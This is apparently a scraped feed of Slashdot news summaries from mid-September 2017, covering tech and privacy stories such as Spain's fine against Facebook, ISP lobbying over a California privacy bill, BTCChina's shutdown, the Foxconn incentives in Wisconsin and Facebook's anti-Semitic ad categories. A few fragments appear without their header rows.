2017-09-15 08:45:00+08:00,Spain Fines Facebook Over Tracking Users Without Consent,Slashdot,"Spain's Data Protection Authority has issued a 1.2 million euro fine against Facebook after it found three instances when the company collected data without informing users, as required by European Union privacy laws. Tom's Hardware reports: The AEPD found multiple issues with how Facebook gathered data on Spanish users. One of the issues was that Facebook collects data on ideology, sex, and religious beliefs, as well as personal tastes and web surfing habits without informing the users about how that data will be used. A second issue was that Facebook wasn't obtaining specific and informed consent from the users because the data it was offering them about the collection was not sufficiently clear. The company has been tracking both users and non-users of the service through the Like button across the web without informing them about this sort of tracking, nor about what it plans to do with the data. The company has said that the collection is done for advertising purposes before, but some purposes remain secret, according to the Spanish Data Protection Authority. The AEPD said this sort of collection doesn't comply with the EU's data protection regulations.
 
Finally, the AEPD also noticed that Facebook has not been completely purging the data about users who had already deleted their accounts and that Facebook was making use of accounts' data that have been deleted for more than 17 months. Considering the data that has remained behind is no longer useful for the purpose for which it was collected, the agency considered this another serious infringement of EU privacy laws.<p><div class=""share_submission"">

2017-09-15 07:20:00+08:00,"ISPs Claim a Privacy Law Would Weaken Online Security, Increase Pop-Ups",Slashdot,"An anonymous reader quotes a report from Ars Technica: The country's biggest Internet service providers and advertising industry lobby groups are fighting to stop a proposed California law that would protect the privacy of broadband customers. AT&amp;T, Comcast, Charter, Frontier, Sprint, Verizon, and some broadband lobby groups urged California state senators to vote against the proposed law in a letter Tuesday. The bill would require Internet service providers to obtain customers' permission before they use, share, or sell the customers' Web browsing and application usage histories. California lawmakers could vote on the bill Friday of this week, essentially replicating federal rules that were blocked by the Republican-controlled Congress and President Trump before they could be implemented. The text and status of the California bill, AB 375, are available here.
 
The letter claims that the bill would ""lead to recurring pop-ops to consumers that would be desensitizing and give opportunities to hackers"" and ""prevent Internet providers from using information they have long relied upon to prevent cybersecurity attacks and improve their service."" The Electronic Frontier Foundation picked apart these claims in a post yesterday. The proposed law won't prevent ISPs from taking security measures because the bill ""explicitly says that Internet providers can use customer's personal information (including things like IP addresses and traffic records) 'to protect the rights or property of the BIAS [Broadband Internet Access Service] provider, or to protect users of the BIAS and other BIAS providers from fraudulent, abusive, or unlawful use of the service,'"" EFF Senior Staff Technologist Jeremy Gillula wrote.<p><div class=""share_submission"">

2017-09-15 06:40:00+08:00,Apple's A11 Bionic Chip In iPhone 8 and iPhone X Smokes Android Handsets In Early Benchmarks,Slashdot,"MojoKid writes: Many of the new releases of Apple's iPhone bring with it a new A-series SoC (System on Chip) and Apple is keeping that tradition with the iPhone 8 and iPhone 8 Plus, and iPhone X. Each of those handsets sports a custom ARM-based A11 Bionic processor with six cores -- four high performance cores and two power efficiency cores. The two power efficiency cores will perform the bulk medial chores to maintain battery life, which Apple says will be 2 hours longer than the iPhone 7. However, for heavier workloads, the chip is capable of not only firing up its four high performance cores, but also all six cores simultaneously. If early leaked benchmarks are any indication, the A11 Bionic is going to be a benchmark-busting beast of a chip. A set of just-posted Geekbench scores reinforces that notion. Just prior to Apple announcing its newest iPhone models, Geekbench's database was updated with a new entry for an ""iPhone 10,5"" which we assume to be the iPhone X. Based on the scores recorded, in this one benchmark at least, the A11 CPU powering the iPhone X appears to be 50 to 70 percent faster than any Android handset on the market currently, even those powered by the new Qualcomm Snapdragon 835.<p><div class=""share_submission"">

When he glanced at his Google Drive Backup folder, he freaked out when he noticed his Nexus 6P backup was missing. He then stumbled upon this Google Drive help document regarding backup expirations: ""Your backup will remain as long as you use your device.

2017-09-15 05:20:00+08:00,Hyperloop One Reveals 10 Strongest Potential Hyperloop Routes In the World,Slashdot,"An anonymous reader quotes a report from TechCrunch: Hyperloop One wants to build a real, working Hyperloop -- but it'll need strong partners to make it a reality, across both industry and government. That's why, in part, it held a global competition requesting proposals for routes around the world. The winners of that competition have now been announced, and the resulting routes span the U.S., the U.K, Mexico, India and Canada. Hyperloop One has assessed each proposal from hundreds of teams who applied from around the world, examining the potential of each from the perspective of infrastructure, technology, regulatory environment and transportation concerns. As a result, it identified the strongest candidates [with four routes in the U.S., two routes in the U.K., one route in Mexico, two routes in India, and one route in Canada.]
 
The next step for each of these winning teams will be a validation process conducted with Hyperloop One to do some in-depth analysis on each route, establishing things like ridership forecast and building a fully fleshed out business case for each. Hyperloop One will be hosting workshops in each of the above countries to help with this process, and to meet with stakeholders and help establish necessary partnerships. Overall, Hyperloop One points out that these winning teams represent a combined population of almost 150 million people, with routes that would link up 53 urban centers around the world and span a total distance of 4,121 miles).<p><div class=""share_submission"">

2017-09-15 04:40:00+08:00,You Are Already Living Inside a Computer,Slashdot,"An anonymous reader shares a report: Think about the computing systems you use every day. All of them represent attempts to simulate something else. Like how Turing's original thinking machine (PDF) strived to pass as a man or woman, a computer tries to pass, in a way, as another thing. As a calculator, for example, or a ledger, or a typewriter, or a telephone, or a camera, or a storefront, or a cafe. After a while, successful simulated machines displace and overtake the machines they originally imitated. The word processor is no longer just a simulated typewriter or secretary, but a first-order tool for producing written materials of all kinds. Eventually, if they thrive, simulated machines become just machines. Today, computation overall is doing this. There's not much work and play left that computers don't handle. And so, the computer is splitting from its origins as a means of symbol manipulation for productive and creative ends, and becoming an activity in its own right. Today, people don't seek out computers in order to get things done; they do the things that let them use computers.<p><div class=""share_submission"">

2017-09-15 04:05:00+08:00,"Bitcoin Exchange BTCChina Says To Stop Trading, Sparking Further Slide",Slashdot,"Several Slashdot readers have shared this Reuters story: Chinese bitcoin exchange BTCChina said on Thursday that it would stop all trading from Sept. 30, setting off a further slide in the value of the cryptocurrency that left it over 30 percent away from the record highs it hit earlier in the month. China has boomed as a cryptocurrency trading location in recent years, as investors and speculators flocked to domestic exchanges that formerly allowed users to conduct trades for free, boosting demand. But that has prompted regulators in the country to crack down on the cryptocurrency sector, in a bid to stamp out potential financial risks as consumers pile into a highly risky and speculative market that has seen unprecedented growth this year. Just hours after BTCChina announced its closure, Chinese news outlet Yicai reported that the country plans to shut down all bitcoin exchanges by the end of September, citing financial sources in Shanghai.<p><div class=""share_submission"">

2017-09-15 03:22:00+08:00,We're Eating Plastics From Our Own Dirty Laundry,Slashdot,"Every time you wash your fleece jacket or other synthetic clothing, microscopic synthetic fibres are released and end up in our food supply and drinking water. From a report: These microfibres are so small -- visible only under a microscope -- that they bypass municipal filtration systems and are consumed by fish and other marine life. A team of women from Waterloo, Ontario is looking to solve that problem. They've designed something that looks a lot like a dryer sheet for your laundry machine. You'd be able to drop this reusable sheet, called PolyGone, into the laundry machine with your dirty clothes. It attracts and traps the microfibres so they can be recycled. They presented their work at the annual AquaHacking conference at the University of Waterloo on Wednesday. ""With these fibres entering our food system and ending up on our plates, we are essentially eating polluted laundry,"" said co-founder Lauren Smith at the conference. The event saw five teams, including hers, compete for tens of thousands of dollars and entry into several local incubators and accelerator centres. Smith has a Masters degree in sustainability management from UW, specializing in water.<p><div class=""share_submission"">

Marty Swant, reporting for AdWeek: Six trade groups -- the Interactive Advertising Bureau, American Advertising Federation, the Association of National Advertisers, the 4A's and two others -- say they're ""deeply concerned"" with Apple's plans to release a version of the internet browser that overrides and replaces user cookie preferences with a set of Apple-controlled standards. The feature, which is called ""Intelligent Tracking Prevention,"" limits how advertisers and websites can track users across the internet by putting in place a 24-hour limit on ad retargeting. In an open letter expected to be published this afternoon, the groups describe the new standards as ""opaque and arbitrary,"" warning that the changes could affect the ""infrastructure of the modern internet,"" which largely relies on consistent standards across websites.

2017-09-15 00:00:00+08:00,Union Power Is Putting Pressure on Silicon Valley's Tech Giants,Slashdot,"An anonymous reader writes: Organized labor doesn't rack up a lot of wins these days, and Silicon Valley isn't most people's idea of a union hotbed. Nonetheless, in the past three years unions have organized 5,000 people who work on Valley campuses. Among others, they've unionized shuttle drivers at Apple, Tesla, Twitter, LinkedIn, EBay, Salesforce.com, Yahoo!, Cisco, and Facebook; security guards at Adobe, IBM, Cisco, and Facebook; and cafeteria workers at Cisco, Intel, and, earlier this summer, Facebook. The workers aren't technically employed by any of those companies. Like many businesses, Valley giants hire contractors that typically offer much less in the way of pay and benefits than the tech companies' direct employees get. Among other things, such arrangements help companies distance themselves from the way their cafeteria workers and security guards are treated, because somebody else is cutting the checks. Silicon Valley Rising, a coalition of unions and civil rights, community, and clergy groups heading the organizing campaign, says its successes have come largely from puncturing that veneer of plausible deniability. That means directing political pressure, media scrutiny, and protests toward the tech companies themselves. ""Everybody knows that the contractors will do what the tech companies say, so we're focused on the big guys,"" says Ben Field, a co-founder of the coalition who heads the AFL-CIO's South Bay Labor Council. Labor leaders say their efforts have gotten some tech companies to cut ties with an anti-union contractor, intervene with others to ease unionization drives, and subsidize better pay for contract workers. ""If you want to get people to buy your product, you don't want them to feel that buying your product is contributing to the evils of the world,"" says Silicon Valley Rising co-founder Derecka Mehrens, who directs Working Partnerships USA, a California nonprofit that advocates for workers. Tech companies have been image-conscious and closely watched of late, she says, and the coalition is ""being opportunistic.""<p><div class=""share_submission"">

2017-09-14 23:20:00+08:00,Two Ex-Googlers Want To Make Bodegas And Mom-And-Pop Corner Stores Obsolete,Slashdot,"Elizabeth Segran, writing for FastCompany: While it sometimes feels like we do all of our shopping on the internet, government data shows that actually less than 10% of all retail transactions happen online. In a world where we get our groceries delivered in just two hours through Instacart or Amazon Fresh, the humble corner store -- or bodega, as they are known in New York and Los Angeles -- still performs a valuable function. No matter how organized you are, you're bound to run out of milk or diapers in the middle of the night and need to make a quick visit to your neighborhood retailer. Paul McDonald, who spent 13 years as a product manager at Google, wants to make this corner store a thing of the past. Today, he is launching a new concept called Bodega with his cofounder Ashwath Rajan, another Google veteran. Bodega sets up five-foot-wide pantry boxes filled with non-perishable items you might pick up at a convenience store. An app will allow you to unlock the box and cameras powered with computer vision will register what you've picked up, automatically charging your credit card. The entire process happens without a person actually manning the ""store."" Bodega's logo is a cat, a nod to the popular bodega cat meme on social media -- although if the duo gets their way, real felines won't have brick-and-mortar shops to saunter around and take naps in much longer. ""The vision here is much bigger than the box itself,"" McDonald says. ""Eventually, centralized shopping locations won't be necessary, because there will be 100,000 Bodegas spread out, with one always 100 feet away from you.""<p><div class=""share_submission"">

2017-09-15 09:25:00+08:00,Wisconsin State Legislature Signs Off On $3 Billion Foxconn Incentive Package,Slashdot,"On Thursday, legislators in the state of Wisconsin approved a nearly $3 billion incentive package for the Taiwanese electronics manufacturer, Foxconn, in exchange for it investing approximately $10 billion in the state and building a factory that could employ up to 13,000 workers. The legislation is now headed to Republican Governor Scott Walker's desk, where he is expected to give it his seal of approval. VentureBeat reports: The bill passed the Wisconsin State Assembly on a 64-31 vote, after previously passing the state senate on a 20-13 vote. The move signals the start of what will likely be an important experiment in just how much generous incentive packages can do to help create new tech hubs. Governor Walker has said that the Foxconn factory &#226;"" the company's first in the United States -- will help transform Wisconsin into ""Wisconn Valley."" While on a trade mission this week to Japan and South Korea, Governor Walker told reporters that many of the companies he met with on the trip were already ""every interested in how they could come to Wisconsin and partner for that new ecosystem."" However, there are still a few details that need to be finalized before Foxconn can start breaking ground -- most notably, where the company will build the factory. The factory was set to be built in either Kenosha or Racine County, Wisconsin, before Kenosha dropped out of the running earlier this week.<p><div class=""share_submission"">

2017-09-15 11:30:00+08:00,Facebook Enabled Advertisers To Reach 'Jew Haters',Slashdot,"ProPublica is reporting that Facebook ""enabled advertisers to direct their pitches to the news feeds of almost 2,300 people who expressed interest in the topics of 'Jew hater,' 'How to burn jews,' or, 'History of why jews ruin the world.'"" The organization even went so far as to test these ad categories by paying $30 to target those groups with three ""promoted posts"" -- in which a ProPublica article or post was displayed in their news feeds. Facebook reportedly approved all three ads within 15 minutes. From the report: After we contacted Facebook, it removed the anti-Semitic categories -- which were created by an algorithm rather than by people -- and said it would explore ways to fix the problem, such as limiting the number of categories available or scrutinizing them before they are displayed to buyers. In all likelihood, the ad categories that we spotted were automatically generated because people had listed those anti-Semitic themes on their Facebook profiles as an interest, an employer or a ""field of study."" Facebook's algorithm automatically transforms people's declared interests into advertising categories. [ProPublica provides a screenshot of their ad buying process on the company's advertising portal.]

 ""There are times where content is surfaced on our platform that violates our standards,"" said Rob Leathern, product management director at Facebook. ""In this case, we've removed the associated targeting fields in question. We know we have more work to do, so we're also building new guardrails in our product and review processes to prevent other issues like this from happening in the future.""<p><div class=""share_submission"">

2017-09-15 15:00:00+08:00,Researchers Find Antidepressants Increase Risk of Death,Slashdot,"Artem Tashkinov shares a report from Medical Xpress: Antidepressant medications, most commonly prescribed to reduce depression and anxiety, increase the risk of death, according to new findings by a McMaster-led team of researchers. It's widely known that brain serotonin affects mood, and that most commonly used antidepressant treatment for depression blocks the absorption of serotonin by neurons. It is less widely known, though, that all the major organs of the body -- the heart, kidneys, lungs, liver -- use serotonin from the bloodstream. Antidepressants block the absorption of serotonin in these organs as well, and the researchers warn that antidepressants could increase the risk of death by preventing multiple organs from functioning properly.

 Interestingly, the news about antidepressants is not all bad. The researchers found that antidepressants are not harmful for people with cardiovascular diseases such as heart disease and diabetes. This makes sense since these antidepressants have blood-thinning effects that are useful in treating such disorders. Unfortunately, this also means that for most people who are in otherwise good cardiovascular health, antidepressants tend to be harmful. The study has been published in the journal Psychotherapy and Psychosomatics.<p><div class=""share_submission"">
